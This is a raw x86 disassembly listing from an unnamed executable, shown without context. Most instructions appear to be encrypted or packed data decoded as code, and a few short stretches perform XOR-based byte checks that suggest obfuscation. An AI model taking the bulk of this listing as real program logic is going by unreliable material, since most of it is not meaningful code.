  4028f9:	gs inc esp
  4028fb:	mov    WORD PTR [ebx-0x10],gs
  4028fe:	adc    DWORD PTR [edx+esi*1+0x13],ecx
  402902:	scas   eax,DWORD PTR es:[edi]
  402903:	inc    esp
  402904:	mov    ds:0x5805b451,eax
  402909:	sbb    DWORD PTR [ebp+eiz*4-0x6e15e165],edi
  402910:	cmp    BYTE PTR [ecx-0x5],al
  402913:	xchg   DWORD PTR [eax+0x1e],ebx
  402916:	and    al,0x5e
  402918:	shl    BYTE PTR [ebx+ecx*4-0x1672636c],cl
  40291f:	pop    ds
  402920:	xchg   edi,eax
  402921:	aam    0xe5
  402923:	mul    eax
  402925:	mov    ah,0x4a
  402927:	stos   DWORD PTR es:[edi],eax
  402928:	sub    dh,0xab
  40292b:	dec    edi
  40292c:	mov    ds,WORD PTR [edx+0x2c]
  40292f:	cli    
  402930:	inc    esp
  402931:	sbb    ebp,esi
  402933:	mov    ds:0x6d07ed7b,al
  402938:	mov    esp,0xfad1ab11
  40293d:	mov    al,ds:0x18570d6b
  402942:	(bad)  
  402943:	mov    al,ds:0x9f88d2f8
  402948:	sub    eax,0x98e3995f
  40294d:	add    BYTE PTR ds:0xbd34f50f,bh
  402953:	push   ecx
  402954:	stos   BYTE PTR es:[edi],al
  402955:	jmp    0x85ae:0x1bd8caaf
  40295c:	hlt    
  40295d:	outs   dx,DWORD PTR ds:[esi]
  40295e:	or     DWORD PTR ds:0x9b36bf08,ecx
  402964:	dec    ecx
  402965:	xchg   edx,eax
  402966:	pushf  
  402967:	push   0x6b
  402969:	icebp  
  40296a:	bound  esp,QWORD PTR [ecx+esi*4+0x47]
  40296e:	sbb    al,0xb4
  402970:	xchg   esi,eax
  402971:	push   esi
  402972:	ret    
  402973:	xor    al,bl
  402975:	in     eax,0x59
  402977:	sar    BYTE PTR [edx],cl
  402979:	jmp    0x402997
  40297b:	or     eax,0x64b9c07c
  402980:	lds    eax,FWORD PTR [edx]
  402982:	add    cl,BYTE PTR [eax-0x1e]
  402985:	stos   BYTE PTR es:[edi],al
  402986:	clc    
  402987:	aam    0x9d
  402989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40298c:	ins    BYTE PTR es:[edi],dx
  40298d:	xlat   BYTE PTR ds:[ebx]
  40298e:	loope  0x402a01
  402990:	loope  0x4029b5
  402992:	leave  
  402993:	pop    ebx
  402994:	sub    al,0xb4
  402996:	sbb    edx,esp
  402998:	dec    ebp
  402999:	scas   eax,DWORD PTR es:[edi]
  40299a:	cdq    
  40299b:	mov    ecx,0xa1536fa5
  4029a0:	fs add al,0x30
  4029a3:	inc    edx
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	xor    BYTE PTR [ebx-0x68c88394],dh
  4029ab:	mov    es,ebx
  4029ad:	jg     0x40299f
  4029af:	test   BYTE PTR [ecx-0x5188bf6a],0x2
  4029b6:	push   ebp
  4029b7:	pusha  
  4029b8:	ins    DWORD PTR es:[edi],dx
  4029b9:	xchg   ebx,eax
  4029ba:	jae    0x402979
  4029bc:	adc    eax,0x494eb4c5
  4029c1:	(bad)  
  4029c2:	loop   0x4029f8
  4029c4:	xor    BYTE PTR [esi],dl
  4029c6:	clc    
  4029c7:	jo     0x402a03
  4029c9:	stc    
  4029ca:	fdivr  DWORD PTR [ebx]
  4029cc:	int3   
  4029cd:	jmp    0x1576:0xd4fc8c9d
  4029d4:	test   eax,0xd7527a32
  4029d9:	sbb    BYTE PTR [edi+edx*4+0x6fdf8de0],0xf3
  4029e1:	or     BYTE PTR [ebx],ah
  4029e3:	hlt    
  4029e4:	out    0x75,eax
  4029e6:	call   0x3703:0x2bd6b276
  4029ed:	ds dec edx
  4029ef:	loope  0x4029d3
  4029f1:	inc    esi
  4029f2:	jae    0x402a04
  4029f4:	ins    DWORD PTR es:[edi],dx
  4029f5:	call   0xc264:0x72ccf9ba
  4029fc:	inc    ecx
  4029fd:	pop    ss
  4029fe:	mov    edi,0xba4a11dd
  402a03:	dec    ebp
  402a04:	arpl   WORD PTR [eax],si
  402a06:	jb     0x4029b7
  402a08:	mov    esp,0x4deb405a
  402a0d:	mov    ecx,0x40fbeb54
  402a12:	xchg   ebp,eax
  402a13:	test   DWORD PTR [ecx-0x4bae0116],esi
  402a19:	stos   BYTE PTR es:[edi],al
  402a1a:	adc    BYTE PTR [ecx+0x25d11d73],ah
  402a20:	sbb    al,BYTE PTR [edx-0x78]
  402a23:	clc    
  402a24:	jb     0x4029fd
  402a26:	pop    ds
  402a27:	push   edx
  402a28:	mov    bh,BYTE PTR [esi]
  402a2a:	call   0x1286:0x196ddce6
  402a31:	jl     0x4029b4
  402a33:	cwde   
  402a34:	es cs (bad) 
  402a37:	std    
  402a38:	(bad)  
  402a39:	repnz outs dx,BYTE PTR ds:[esi]
  402a3b:	mov    ecx,0x5413a1c3
  402a40:	lds    edx,FWORD PTR [ecx]
  402a42:	adc    edx,0xa
  402a45:	stos   BYTE PTR es:[edi],al
  402a46:	or     BYTE PTR [esi-0x20],dl
  402a49:	in     al,dx
  402a4a:	xor    ecx,DWORD PTR [ecx-0x53a117fb]
  402a50:	sbb    ebp,edi
  402a52:	push   esi
  402a53:	push   eax
  402a54:	xor    BYTE PTR [edx+0x36],ch
  402a57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a58:	iret   
  402a59:	outs   dx,DWORD PTR ds:[esi]
  402a5a:	stos   DWORD PTR es:[edi],eax
  402a5b:	mov    bh,0x86
  402a5d:	fs aas 
  402a5f:	xor    esp,DWORD PTR cs:[ecx]
  402a62:	cdq    
  402a63:	sbb    DWORD PTR [edx],edi
  402a65:	pushf  
  402a66:	sbb    eax,0x8b8ec9bb
  402a6b:	push   edx
  402a6c:	dec    eax
  402a6d:	inc    ebp
  402a6e:	cmp    dl,bl
  402a70:	push   es
  402a71:	pop    edx
  402a72:	pop    ss
  402a73:	lods   eax,DWORD PTR ds:[esi]
  402a74:	mov    esp,0x4594a959
  402a79:	xchg   ebx,eax
  402a7a:	xchg   ecx,eax
  402a7b:	rol    DWORD PTR [edx+0x1cee5ea9],cl
  402a81:	ret    
  402a82:	and    esi,esp
  402a84:	in     eax,0x68
  402a86:	test   DWORD PTR [esi],0x692ddcf4
  402a8c:	cli    
  402a8d:	jmp    0x53849f58
  402a92:	push   eax
  402a94:	neg    BYTE PTR [edx-0x62]
  402a97:	(bad)
  402a9c:	aas    
  402a9d:	popf   
  402a9e:	bound  ecx,QWORD PTR [eax+0x1c]
  402aa1:	pop    edi
  402aa2:	rep lods eax,DWORD PTR ds:[esi]
  402aa4:	jg     0x402ad7
  402aa6:	inc    BYTE PTR [edi]
  402aa8:	ins    BYTE PTR es:[edi],dx
  402aa9:	mov    cl,0x7
  402aab:	cmp    eax,0x42266c67
  402ab0:	out    dx,al
  402ab1:	pop    ebx
  402ab2:	mov    cl,0x6e
  402ab4:	dec    esp
  402ab5:	cmp    DWORD PTR [eax+0x66],ebp
  402ab8:	loopne 0x402a78
  402aba:	pop    ss
  402abb:	pop    esi
  402abc:	stc    
  402abd:	scas   al,BYTE PTR es:[edi]
  402abe:	daa    
  402abf:	jg     0x402b39
  402ac1:	es jno 0x402ac1
  402ac4:	xchg   ecx,eax
  402ac5:	test   BYTE PTR es:[edi-0x56],ch
  402ac9:	call   0xafae:0xd529c1dd
  402ad0:	(bad)
  402ad3:	fist   WORD PTR [esi-0x67]
  402ad6:	ins    DWORD PTR es:[edi],dx
  402ad7:	inc    eax
  402ad8:	adc    eax,0xac5eb906
  402add:	leave  
  402ade:	sub    edi,DWORD PTR [eax+0x3]
  402ae1:	(bad)  [edx]
  402ae3:	or     eax,0xba5766ac
  402ae8:	aas    
  402ae9:	hlt    
  402aea:	adc    ebx,DWORD PTR [edx]
  402aec:	out    0x17,eax
  402aee:	adc    ecx,DWORD PTR [ecx-0x6b]
  402af1:	(bad)  
  402af2:	idiv   DWORD PTR [eax]
  402af4:	pop    edi
  402af5:	aaa    
  402af6:	and    BYTE PTR ds:[esp+ebx*2-0x77],dl
  402afb:	data16 mov ch,0xe2
  402afe:	fwait
  402aff:	jns    0x402b7d
  402b01:	push   ebp
  402b02:	or     eax,0x473c031e
  402b07:	pop    ss
  402b08:	repz ds pushf 
  402b0b:	div    DWORD PTR [eax-0x36f4591]
  402b11:	jo     0x402acf
  402b13:	pop    eax
  402b14:	add    eax,0x439a4129
  402b19:	jae    0x402aea
  402b1b:	xlat   BYTE PTR ds:[ebx]
  402b1c:	jns    0x402b1c
  402b1e:	jnp    0x402b16
  402b20:	or     al,0x51
  402b22:	loope  0x402b76
  402b24:	daa    
  402b25:	push   ds
  402b26:	or     ah,al
  402b28:	push   esi
  402b29:	enter  0x6eeb,0x7c
  402b2d:	fxch   st(1)
  402b2f:	call   0x78d:0x8a73f56b
  402b36:	adc    al,0x83
  402b38:	mov    ds:0xb9ffbf38,eax
  402b3d:	les    ebp,FWORD PTR [ebp-0x78]
  402b40:	popa   
  402b41:	mov    al,ds:0x4d5b77ad
  402b46:	and    al,0x9a
  402b48:	mov    WORD PTR gs:[edx-0x60ccf075],cs
  402b4f:	xor    edx,0x2f
  402b52:	cwde   
  402b53:	pop    ebx
  402b54:	push   eax
  402b55:	cmp    al,BYTE PTR [ecx+0x3d]
  402b58:	push   eax
  402b59:	mov    cl,0x5d
  402b5b:	mov    eax,0xa5a6cda7
  402b60:	lds    esp,FWORD PTR es:[esi+0x17]
  402b64:	inc    esi
  402b65:	test   eax,0x6ebb6ff2
  402b6b:	repz jge 0x402bda
  402b6e:	cs (bad) 
  402b70:	std    
  402b71:	imul   ebx,edx,0x736a5bb5
  402b77:	leave  
  402b78:	inc    ebx
  402b79:	daa    
  402b7a:	or     eax,0x2fa02580
  402b7f:	adc    eax,0xdf90b6f6
  402b84:	mov    edi,0xdd392edd
  402b89:	ror    DWORD PTR [ebp+0x47f065e9],1
  402b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b90:	jge    0x402bcc
  402b92:	mov    DWORD PTR [edi+eiz*2-0x12],ebp
  402b96:	mul    BYTE PTR [edx+0x2c]
  402b99:	mov    ds:0xa25517e8,eax
  402b9e:	mov    al,ds:0x47f55cf5
  402ba3:	sbb    al,0xe6
  402ba5:	mov    esi,ebx
  402ba7:	leave  
  402ba8:	clc    
  402ba9:	stc    
  402baa:	loope  0x402b7d
  402bac:	pop    es
  402bad:	cdq    
  402bae:	ins    BYTE PTR es:[edi],dx
  402baf:	sbb    al,0x54
  402bb1:	int    0xd1
  402bb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bb4:	and    eax,0xc0e8e343
  402bb9:	or     ah,bh
  402bbb:	and    dl,BYTE PTR [ebp-0x3a]
  402bbe:	ds stc 
  402bc0:	mov    ebx,0xf00d2179
  402bc5:	into   
  402bc6:	push   edi
  402bc7:	loope  0x402c12
  402bc9:	push   ebp
  402bca:	imul   esp,DWORD PTR [eax+0x121ed85a],0xabbfb755
  402bd4:	adc    BYTE PTR [ecx-0x75],ah
  402bd7:	inc    eax
  402bd8:	cmp    al,0x8d
  402bda:	or     al,0xcd
  402bdc:	js     0x402bde
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	cmp    eax,0xc4572535
  402c71:	adc    eax,0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	push   esi
  402c79:	in     eax,dx
  402c7a:	mov    ds:0xa094df7b,al
  402c7f:	jecxz  0x402c15
  402c81:	pop    edx
  402c82:	jmp    0x13616f8b
  402c87:	loopne 0x402c67
  402c89:	(bad)  
  402c8a:	pop    ebx
  402c8b:	mov    eax,0xac416aea
  402c90:	jbe    0x402c77
  402c92:	mov    edi,0x632b6ac4
  402c97:	cmp    eax,0xe7fc07a1
  402c9c:	xchg   DWORD PTR [edi],eax
  402c9e:	xchg   ebx,eax
  402c9f:	mov    DWORD PTR [ebx+0x42b2a22a],ecx
  402ca5:	pop    ebx
  402ca6:	mov    ebx,0x4acb666b
  402cab:	jmp    0x6c34:0x96882b92
  402cb2:	icebp  
  402cb3:	call   0x93c3:0x5a539ee9
  402cba:	mov    BYTE PTR [edi+0x7847adce],bh
  402cc0:	fisttp DWORD PTR [ecx-0xc]
  402cc3:	imul   ebx,DWORD PTR [edi],0xbee03720
  402cc9:	mov    bl,0xf3
  402ccb:	cld    
  402ccc:	and    ebp,ebx
  402cce:	push   cs
  402ccf:	sbb    ah,bl
  402cd1:	inc    esi
  402cd2:	dec    edi
  402cd3:	and    DWORD PTR [eax+0x7abbb6ba],esp
  402cd9:	retf   
  402cda:	lods   eax,DWORD PTR ds:[esi]
  402cdb:	test   BYTE PTR [esi],dl
  402cdd:	or     eax,0xcbed1b5e
  402ce2:	xchg   ecx,eax
  402ce3:	pop    ds
  402ce4:	(bad)  
  402ce5:	daa    
  402ce6:	aas    
  402ce7:	cs cs sub al,0xe
  402ceb:	sbb    bh,BYTE PTR [edi]
  402ced:	ficom  WORD PTR ds:0xe09ea96f
  402cf3:	jp     0x402c96
  402cf5:	loop   0x402d60
  402cf7:	adc    dl,BYTE PTR [edi+ecx*4]
  402cfa:	xor    eax,0x2ecfb136
  402cff:	pop    esi
  402d00:	push   esp
  402d01:	cmc    
  402d02:	imul   edx,ebx,0xffffffbf
  402d05:	cmp    bl,bl
  402d07:	or     BYTE PTR [edx+0xfb6be72],0x27
  402d0e:	je     0x402c97
  402d10:	ss mov edi,0x24156cf6
  402d16:	sub    DWORD PTR [esi],esp
  402d18:	fwait
  402d19:	adc    bl,al
  402d1b:	mov    ecx,0xceb1413a
  402d20:	int3   
  402d21:	pop    ebp
  402d22:	(bad)  [esi]
  402d24:	in     al,0xda
  402d26:	xchg   ecx,eax
  402d27:	or     ebx,DWORD PTR [esi+0x6fc92c5c]
  402d2d:	test   bl,0x78
  402d30:	inc    edx
  402d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d32:	adc    dh,BYTE PTR ds:[ebp+0x67]
  402d36:	in     eax,0x8d
  402d38:	aas    
  402d39:	ret    0xa489
  402d3c:	jne    0x402d10
  402d3e:	jb     0x402d98
  402d40:	fwait
  402d41:	sub    eax,0xd3a6f23b
  402d46:	mov    eax,ds:0x60295c63
  402d4b:	(bad)
  402d4e:	pop    esp
  402d4f:	mov    dl,0x9
  402d51:	mov    al,0x13
  402d53:	test   eax,0x9bb643ca
  402d58:	test   al,0x50
  402d5a:	out    0x82,eax
  402d5c:	mov    al,ds:0x22aebc27
  402d61:	inc    ebp
  402d62:	mov    ?,WORD PTR [edx]
  402d64:	sub    ecx,DWORD PTR [eax+ecx*2]
  402d67:	push   0xffffffb5
  402d69:	dec    edi
  402d6a:	or     DWORD PTR [eax*8+0x23066d3f],eax
  402d71:	inc    edx
  402d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d73:	jno    0x402d6e
  402d75:	pusha  
  402d76:	in     al,dx
  402d77:	les    esi,FWORD PTR [eax+0x78]
  402d7a:	xor    ah,BYTE PTR [ebp-0x73]
  402d7d:	sbb    esi,ebx
  402d7f:	cmp    ah,BYTE PTR [ecx-0x24c71354]
  402d85:	push   edx
  402d86:	cmc    
  402d87:	test   al,0x90
  402d89:	int    0x62
  402d8b:	dec    ebp
  402d8c:	dec    edx
  402d8d:	in     eax,0xe4
  402d8f:	push   0x90204efb
  402d94:	sbb    BYTE PTR [ebx+edx*4+0x2513fd9a],ch
  402d9b:	loope  0x402dff
  402d9d:	adc    eax,0x265790e4
  402da2:	in     eax,0x72
  402da4:	sbb    eax,0xe8255f51
  402da9:	push   es
  402daa:	push   ebx
  402dab:	loopne 0x402e16
  402dad:	cld    
  402dae:	mov    edi,0x9e73216f
  402db3:	and    ecx,ecx
  402db5:	or     ah,al
  402db7:	add    eax,0xba44d124
  402dbc:	push   cs
  402dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dbe:	in     eax,0x1b
  402dc0:	test   eax,0x4c21cf45
  402dc5:	(bad)  
  402dc6:	cmp    cl,bh
  402dc8:	int    0x69
  402dca:	cmp    al,ch
  402dcc:	enter  0x32f8,0x6f
  402dd0:	pop    ds
  402dd1:	cld    
  402dd2:	mov    esi,0x6d884302
  402dd7:	out    0x2a,al
  402dd9:	push   dx
  402ddb:	dec    esp
  402ddc:	mov    ch,0x6b
  402dde:	xchg   cl,bl
  402de0:	lock mov dh,0x2e
  402de3:	dec    esp
  402de4:	or     ebx,DWORD PTR [ecx]
  402de6:	mov    eax,ds:0xaca281f0
  402deb:	mov    ebp,0x8f227692
  402df0:	mov    eax,0xa9cade5e
  402df5:	mov    bl,0x5b
  402df7:	mov    bh,0x88
  402df9:	dec    ecx
  402dfa:	lods   eax,DWORD PTR ds:[esi]
  402dfb:	outs   dx,DWORD PTR ds:[esi]
  402dfc:	jne    0x402e00
  402dfe:	xor    dl,0x78
  402e01:	cdq    
  402e02:	push   es
  402e03:	aam    0x82
  402e05:	std    
  402e06:	ds inc edi
  402e08:	jbe    0x402d93
  402e0a:	push   esp
  402e0b:	mov    esp,0x68dba725
  402e10:	outs   dx,BYTE PTR ds:[esi]
  402e11:	jo     0x402e13
  402e13:	mov    WORD PTR [eax],es
  402e15:	cld    
  402e16:	pop    esp
  402e17:	push   cs
  402e18:	out    0xf4,al
  402e1a:	ins    DWORD PTR es:[edi],dx
  402e1b:	das    
  402e1c:	data16 fstp QWORD PTR [bx+si+0x3e]
  402e21:	pop    ebp
  402e22:	pop    ebp
  402e23:	xchg   BYTE PTR [ebx-0x1a],bl
  402e26:	mov    edx,0xb6160324
  402e2b:	sahf   
  402e2c:	fwait
  402e2d:	in     eax,dx
  402e2e:	ret    0x13a7
  402e31:	jmp    0x574c0d4e
  402e36:	adc    DWORD PTR [ebx+ebp*4],0x4d667933
  402e3d:	xor    eax,0xda46e7c9
  402e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e43:	test   DWORD PTR [ebx+0x10313b0d],0x63024386
  402e4d:	aas    
  402e4e:	stos   BYTE PTR es:[edi],al
  402e4f:	jecxz  0x402ebd
  402e51:	sahf   
  402e52:	addr16 idiv esp
  402e55:	(bad)  
  402e56:	aam    0x71
  402e58:	xor    DWORD PTR [edi-0x7bfb1f1b],ecx
  402e5e:	fidivr DWORD PTR [edx]
  402e60:	sbb    bh,bl
  402e62:	iret   
  402e63:	jg     0x402eaf
  402e65:	pop    edx
  402e66:	lock inc esp
  402e68:	fisttp DWORD PTR [ecx]
  402e6a:	xor    cl,bh
  402e6c:	and    esi,ebp
  402e6e:	cmc    
  402e6f:	enter  0x9c83,0x32
  402e73:	aaa    
  402e74:	sbb    BYTE PTR [eax-0x51],0xd3
  402e78:	fbstp  TBYTE PTR [esi+0x2ebbf10a]
  402e7e:	xchg   esi,eax
  402e7f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e81:	adc    DWORD PTR [bx-0x35a7],eax
  402e86:	or     al,0xed
  402e88:	outs   dx,DWORD PTR ds:[esi]
  402e89:	jp     0x402e75
  402e8b:	jle    0x402e63
  402e8d:	dec    eax
  402e8e:	test   eax,0x86786e1d
  402e93:	inc    edx
  402e94:	inc    ebx
  402e95:	jno    0x402e24
  402e97:	add    dh,BYTE PTR [ecx+0x6bab8657]
  402e9d:	cmp    BYTE PTR [edi-0x6a739813],dl
  402ea3:	gs mov edx,0x39a929cc
  402ea9:	rcr    edx,1
  402eab:	inc    edx
  402eac:	push   ecx
  402ead:	mov    bl,0xac
  402eaf:	popa   
  402eb0:	and    cl,BYTE PTR [esi+0x138defa0]
  402eb6:	bound  esi,QWORD PTR [edi+0x1c37c973]
  402ebc:	ds es jb 0x402f21
  402ec0:	inc    ebp
  402ec1:	jb     0x402ef1
  402ec3:	mov    cl,0x64
  402ec5:	inc    ecx
  402ec6:	test   al,0x23
  402ec8:	imul   DWORD PTR [edx]
  402eca:	pop    eax
  402ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ecc:	je     0x402e61
  402ece:	adc    eax,0x3449a6e
  402ed3:	dec    eax
  402ed4:	inc    eax
  402ed5:	xchg   al,dl
  402ed7:	stos   BYTE PTR es:[edi],al
  402ed8:	or     ebp,ebp
  402eda:	pop    ebp
  402edb:	or     ch,BYTE PTR [edi]
  402edd:	daa    
  402ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402edf:	in     eax,0x65
  402ee1:	outs   dx,BYTE PTR ds:[esi]
  402ee2:	sbb    esi,DWORD PTR [eax+ecx*4-0x38]
  402ee6:	mov    eax,0x5defc71b
  402eeb:	fld    DWORD PTR [ecx]
  402eed:	or     esi,DWORD PTR [edi+0x3]
  402ef0:	sub    eax,0x8000ad6f
  402ef5:	dec    edi
  402ef6:	xor    eax,0xd564b781
  402efb:	fstp   DWORD PTR [eax-0x3]
  402efe:	loop   0x402f66
  402f00:	cmp    edx,ecx
  402f02:	hlt    
  402f03:	and    DWORD PTR [ebx-0x45],0x8d48acfd
  402f0a:	or     al,0x6c
  402f0c:	inc    ebx
  402f0d:	push   ebp
  402f0e:	retf   
  402f0f:	in     eax,0xcd
  402f11:	push   ds
  402f12:	fucomp st(5)
  402f14:	xor    al,0x7
  402f16:	adc    eax,0x9b313f77
  402f1b:	or     al,0x29
  402f1d:	sbb    eax,0xd5b12cb2
  402f22:	mov    dh,dh
  402f24:	fisubr WORD PTR [ebp+0x4b687b63]
  402f2a:	sub    eax,0x75751eef
  402f2f:	retf   0xeb81
  402f32:	pop    edi
  402f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f34:	jbe    0x402f1f
  402f36:	jle    0x402f57
  402f38:	sub    DWORD PTR [edx+0xe4bb4f],esi
  402f3e:	frstor [ebx+0x1c]
  402f41:	scas   al,BYTE PTR es:[edi]
  402f42:	test   BYTE PTR [ebx+0x7f],dh
  402f45:	call   0x5a87e529
  402f4a:	mov    bl,0x4b
  402f4c:	in     eax,0x3b
  402f4e:	js     0x402f6e
  402f50:	cmp    ah,al
  402f52:	setae  dl
  402f55:	inc    edx
  402f56:	push   0x65
  402f58:	jnp    0x402f1c
  402f5a:	(bad)  
  402f5b:	sbb    edx,DWORD PTR [edx-0x55b014c6]
  402f61:	push   DWORD PTR [ebp-0x8]
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0xdef:0x1360eb95
  402f8e:	shl    BYTE PTR ds:0x7c7c162f,1
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x402f66
  402f99:	fild   DWORD PTR [eax-0x5e]
  402f9c:	outs   dx,DWORD PTR ds:[esi]
  402f9d:	call   0x242e:0xe534ca0e
  402fa4:	hlt    
  402fa5:	add    ch,BYTE PTR [ebx+ebx*8-0x30]
  402fa9:	mov    eax,DWORD PTR [ebp+0x15]
  402fac:	fidivr DWORD PTR [esi+0x9]
  402faf:	aaa    
  402fb0:	shl    BYTE PTR [eax],0x60
  402fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fb4:	xchg   ebp,eax
  402fb5:	sub    al,0x3f
  402fb7:	cwde   
  402fb8:	loopne 0x403037
  402fba:	xor    dh,dh
  402fbc:	outs   dx,BYTE PTR ds:[esi]
  402fbd:	mov    ?,WORD PTR [edi+eax*8+0x49a74513]
  402fc4:	pop    esi
  402fc5:	aas    
  402fc6:	les    eax,FWORD PTR [edx]
  402fc8:	stc    
  402fc9:	sub    eax,0x439cf258
  402fce:	adc    eax,0x504a6ea1
  402fd3:	mov    al,0xca
  402fd5:	xchg   ecx,eax
  402fd6:	nop
  402fd7:	scas   al,BYTE PTR es:[edi]
  402fd8:	add    eax,0x6eeb3c7c
  402fdd:	mov    WORD PTR [edi+0x7284ecac],?
  402fe3:	and    BYTE PTR [edx-0x5a],dh
  402fe6:	enter  0xd08f,0x91
  402fea:	and    ch,BYTE PTR [edx-0x56e481d6]
  402ff0:	xchg   edx,eax
  402ff1:	jmp    0xb93d5ca3
  402ff6:	out    0x56,eax
  402ff8:	dec    ebx
  402ff9:	js     0x402fcc
  402ffb:	clc    
  402ffc:	adc    eax,0x3326bde3
  403001:	and    ch,cl
  403003:	cmp    BYTE PTR [esi-0x6d],ah
  403006:	mov    edx,0xb3994365
  40300b:	rol    BYTE PTR [ecx-0x1c],0xcf
  40300f:	mov    edi,0x25f00b94
  403014:	ret    0xd0bc
  403017:	jb     0x402fff
  403019:	mov    eax,ds:0x5de22cd9
  40301e:	loope  0x402fdf
  403020:	xchg   esp,eax
  403021:	and    BYTE PTR [ebp+0x2],bh
  403024:	out    0xc7,al
  403026:	xor    edx,DWORD PTR [ecx]
  403028:	sbb    ah,cl
  40302a:	dec    ecx
  40302b:	js     0x403072
  40302d:	out    0x81,al
  40302f:	or     BYTE PTR [ebx+0x62],0x93
  403033:	mov    DWORD PTR [esi+edx*8],esp
  403036:	rol    BYTE PTR [eax],0x3b
  403039:	mov    WORD PTR [ebx+esi*4+0x74],cs
  40303d:	inc    edi
  40303e:	popf   
  40303f:	push   edi
  403040:	sbb    ebp,DWORD PTR [ebx-0x37694751]
  403046:	mov    DWORD PTR [edi+ebx*2-0x63],eax
  40304a:	add    esi,edx
  40304c:	and    al,0xe3
  40304e:	jns    0x403007
  403050:	mov    edx,0xdb8b6f1b
  403055:	add    BYTE PTR [eax+0x69c2bf67],0xf3
  40305c:	leave  
  40305d:	test   eax,0x335da1ac
  403062:	sbb    DWORD PTR [edi-0x17],edx
  403065:	shl    ebx,1
  403067:	scas   eax,DWORD PTR es:[edi]
  403068:	out    dx,al
  403069:	(bad)  
  40306a:	fisttp QWORD PTR ds:0x62e9d76e
  403070:	cli    
  403071:	add    ebp,DWORD PTR [ebp+0x43e083fa]
  403077:	repz sub DWORD PTR [esi],0x3
  40307b:	mov    edi,0xfcd76be
  403080:	sbb    DWORD PTR [edi+eiz*8],eax
  403083:	icebp  
  403084:	repz pop esi
  403086:	jecxz  0x403052
  403088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403089:	iret   
  40308a:	rcr    ebx,1
  40308c:	inc    edx
  40308d:	and    BYTE PTR [ecx-0x3ca9a691],ah
  403093:	call   0x164f:0x669d9554
  40309a:	fdivp  st(0),st
  40309c:	pop    ds
  40309d:	cmp    DWORD PTR [esi-0x7ce2a48b],0xffffffc6
  4030a4:	pop    ebp
  4030a5:	mov    ah,0x10
  4030a7:	daa    
  4030a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a9:	fisubr DWORD PTR [ebx-0x56ac3f8c]
  4030af:	sbb    al,0x30
  4030b1:	adc    eax,0x99ad1ca7
  4030b6:	push   ebx
  4030b7:	stos   DWORD PTR es:[edi],eax
  4030b8:	mov    ch,0x2d
  4030ba:	pop    es
  4030bb:	fistp  DWORD PTR [ebx-0x1f]
  4030be:	mov    ecx,0xd8241ff9
  4030c3:	xchg   edi,eax
  4030c4:	add    bl,dh
  4030c6:	mov    edi,0xb4a0d994
